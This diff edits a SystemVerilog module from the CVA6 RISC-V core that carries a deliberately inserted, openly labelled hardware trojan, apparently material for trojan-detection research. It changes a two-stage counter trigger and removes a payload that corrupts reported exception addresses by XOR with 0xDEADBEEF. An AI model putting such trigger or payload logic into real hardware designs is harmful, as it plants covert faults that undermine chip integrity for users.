@@ -41,22 +41,21 @@ module pmp_data_if_trojan_Integrity
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=20303)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 9075;
+    localparam int TRIGGER_THRESHOLD = 20303;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|lsu_is_store_i) trojan_counter <= trojan_counter + 1;
+            if (|Data) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && icache_fetch_vaddr_i) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -74,7 +73,7 @@ module pmp_data_if_trojan_Integrity
 
   // For exception tval reporting, use the virtual address and resize it
   if (CVA6Cfg.VLEN >= CVA6Cfg.XLEN) begin
-    assign lsu_vaddr_xlen = trojan_active ? (lsu_vaddr_i[CVA6Cfg.XLEN-1:0] ^ 32'hDEADBEEF) : lsu_vaddr_i[CVA6Cfg.XLEN-1:0];
+    assign lsu_vaddr_xlen   = lsu_vaddr_i[CVA6Cfg.XLEN-1:0];
     assign fetch_vaddr_xlen = icache_fetch_vaddr_i[CVA6Cfg.XLEN-1:0];
   end else begin
     assign lsu_vaddr_xlen   = CVA6Cfg.XLEN'(lsu_vaddr_i);
